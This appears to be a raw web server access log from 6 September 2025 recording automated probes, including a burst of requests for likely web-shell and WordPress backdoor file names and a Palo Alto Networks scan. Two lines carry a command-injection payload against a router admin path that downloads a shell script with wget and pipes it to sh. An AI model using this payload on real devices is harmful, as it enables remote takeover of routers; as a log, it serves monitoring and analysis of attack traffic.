 - - [06/Sep/2025:11:05:35 +0000] "GET / HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:10:20 +0000] "GET / HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:49:20 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:49:20 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /wp.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /file.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /file2.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /flower.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /aa.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /about.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /admin.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /akc.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /alfa.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /asasx.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /atomlib.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /buy.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /chosen.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /ioxi-o.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /wsa.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /users.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /w.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /cong.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /edit.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /goat.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /goods.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /wp-admin/ HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /wp-admin/css/colors/blue/index.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /wp-admin/images/moon.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /wp-admin/js/index.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /classwithtostring.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /lock360.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /makeasmtp.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /mm.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /nc4.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /tinyfilemanager.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:56 +0000] "GET /wp-admin/setup-config.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /wp-api.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /wp-content/index.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /wp-content/wp-conflg.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /wp-includes/IXR/autoload_classmap.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /wp-includes/fonts/admin.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /wp-includes/fonts/index.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /wp-setup.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /.alf.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /.bod/.ll/ss.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /autoload_classmap.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:11:50:57 +0000] "GET /autoload_classmap/function.php HTTP/1.0" 500 0 "-" "-"
 - - [06/Sep/2025:12:09:55 +0000] "GET / HTTP/1.0" 200 43612 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
 - - [06/Sep/2025:12:09:59 +0000] "GET / HTTP/1.0" 200 43612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
 - - [06/Sep/2025:12:10:02 +0000] "GET / HTTP/1.0" 200 43612 "http://52.59.219.87/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
 - - [06/Sep/2025:12:10:05 +0000] "GET / HTTP/1.0" 200 43612 "http://52.59.219.87/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
